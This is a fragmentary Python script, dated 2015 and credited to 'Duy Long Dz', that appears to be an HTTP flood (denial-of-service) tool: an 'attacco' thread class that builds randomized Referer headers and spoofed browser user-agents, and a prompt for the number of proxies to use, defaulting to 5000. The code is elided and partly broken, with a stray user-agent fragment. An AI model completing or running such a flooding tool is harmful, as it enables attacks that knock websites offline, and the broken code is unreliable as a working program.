...
#coding: utf8
#Code Draving_V8 By Duy Long Dz
#May 10th 2015

import random
import socket
; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
...
class attacco(threading.Thread):
    def run(self):
        ...
        referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(1, 5000)) + "\r\n"
...
#So luong 1
thread = input("Number Proxy using(5000): ")
